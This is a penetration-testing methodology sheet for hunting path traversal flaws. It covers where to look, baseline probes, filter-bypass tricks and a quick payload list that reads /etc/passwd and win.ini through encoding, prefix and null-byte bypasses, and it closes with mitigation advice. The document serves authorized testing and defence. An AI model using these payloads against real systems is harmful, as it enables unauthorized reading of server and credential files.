### Path Traversal Hunt Methodology

Use only with explicit authorization. This decision tree covers discovery, common filter behaviors, and reliable bypasses.

---

## Decision tree: question-driven hunting

1) Find file path features
- File viewers/downloads (`?file=`, `?image=`, `?path=`), export/import, logs, backups, template loaders, report renderers.
- Inputs: query/body fields, cookies (e.g., last file), headers (X-File).

2) Baseline probes
- Unix: `../../../../etc/passwd`
- Windows: `..\..\..\..\Windows\win.ini`
- Absolute paths: `/etc/passwd`, `C:\\Windows\\win.ini`.

3) Observe filter behavior
- Blocks `../` but not absolute path? Try `/etc/passwd`.
- Strips `../` once (non-recursive)? Use `....//` repetition to survive one-pass normalization.
- Decodes then strips? Use double-encoding: `%252e%252e%252f` (becomes `%2e%2e/` then `../`).
- Requires prefix path? Prepend expected base then backtrack: `/var/www/images/../../../etc/passwd`.
- Requires extension? Use null byte or parser quirks: `%00.jpg`, mixed case, or add safe suffix.

4) Delivery details
- Try without and with URL-encoding; also double-encode when needed.
- Normalize slashes: `/..//..//` or mixed `..%2f..%2f`.
- For Windows, test `%2e%2e%5c` and UNC paths if applicable.

5) Confirm impact
- Read harmless but unique-signal files first: `/etc/hostname`, `/etc/passwd` (Unix), `C:\\Windows\\win.ini` (Windows).
- Avoid writing/executing files unless explicitly in-scope.

---

## Quick payload mapping

- Basic: `../../../../etc/passwd`
- Absolute bypass: `/etc/passwd`
- Non-recursive strip bypass: `....//....//....//etc/passwd`
- Double URL-decode bypass: `%252e%252e%252f%252e%252e%252fetc/passwd`
- Base-path validation bypass: `/var/www/images/../../../etc/passwd`
- Extension validation bypass: `%2f..%2f..%2f..%2fetc%2fpasswd%00.jpg`
- Windows basic: `..\..\..\..\Windows\win.ini`

---

## Reporting/mitigation

- Use allowlists of file identifiers, not raw paths. Map IDs → server-side paths.
- Normalize and canonicalize paths; reject any that traverse outside allowed roots.
- Do not rely on simple substring removal; validate after canonicalization.
- Enforce required extensions/types server-side; for downloads, stream from known directories only.
- Drop process privileges; ensure filesystem permissions prevent lateral reads.


